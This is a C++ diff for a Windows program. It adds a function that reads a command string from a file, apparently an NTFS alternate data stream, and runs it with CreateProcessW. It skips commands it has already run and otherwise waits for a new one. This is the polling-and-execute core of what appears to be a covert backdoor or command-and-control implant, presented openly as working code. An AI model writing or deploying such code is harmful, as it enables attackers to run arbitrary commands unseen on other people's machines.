@@ -4,7 +4,9 @@
 #include <random>
 #include <ctime>
 #include <fstream>
+#include <windows.h>
 
+std::wstring tempCommand = L"echo hi";
 
 // Function to generate a random filename like 'ksfjs32dj4545kf.txt'
 std::wstring GenerateRandomFilename() {
@@ -38,4 +40,42 @@ std::wstring readCommentFromFile(const std::wstring& filePath) {
     file.close();  // Close the file after reading
 
     return command;  // Return the command/comment read from the file
+}
+
+void ExecuteCommandFromFile(const std::wstring& localFile) {
+    std::wstring command = readCommentFromFile(localFile);  // Read the command from the ADS
+    
+
+    if (!command.empty()) {
+        std::wcout << L"Command from File: " << command << std::endl;
+
+        if (command != tempCommand) {
+            // Prepare to execute the command
+            STARTUPINFO si = { 0 };
+            PROCESS_INFORMATION pi = { 0 };
+            si.cb = sizeof(si);
+
+            // Create the process
+            BOOL hr = CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+            if (hr == 0) {
+                std::wcerr << L"Failed to execute command. Error: " << GetLastError() << std::endl;
+            }
+            else {
+                // Wait for the process to exit (optional)
+                WaitForSingleObject(pi.hProcess, INFINITE);
+
+                // Close handles
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+
+                tempCommand = command;
+            }
+        }
+        else {
+            std::wcout << L"No command yet, waiting" << std::endl;
+        }
+    }
+    else {
+        std::wcerr << L"No command found in File." << std::endl;
+    }
 }
